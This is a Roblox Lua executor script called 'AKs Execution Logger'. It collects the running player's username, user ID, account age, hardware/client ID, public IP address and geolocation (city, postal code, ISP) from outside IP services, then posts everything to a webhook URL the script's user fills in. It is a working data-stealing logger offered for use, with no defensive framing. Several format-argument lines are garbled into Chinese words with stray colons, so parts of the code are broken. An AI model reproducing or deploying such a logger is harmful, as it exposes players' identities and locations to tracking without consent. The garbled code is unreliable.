local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 游戏信息",
                description = string.format("**[%s](%s)**\n`ID: %d`", 游戏名字, 游戏链接, 游戏ID),
                color = tonumber("0x2ecc71")
            },
            {
                title = "👤 用户信息",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    显示名称:, 玩家链接:, 用户名:, 用户ID:, 成员类型:, 年龄:, 平台:, 延迟:
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 位置 & 网络(IPV4)",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    地址:, HWID:, 数据&国家:, 加载降低(国家数据代码):, 获取区域名称:, 城市:, 邮政编码:, 网络服务提供商:, 有机:, 时区:
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ 技术支持",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [点击以复制](%s)\n**Mobile Join:** [点击](%s)",
                    注入器:, 工作链接:, 手机加入链接:
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("📅 日期: %s | ⏰ 时间: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "PUT_YOUR_WEBHOOK_URL_HERE"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)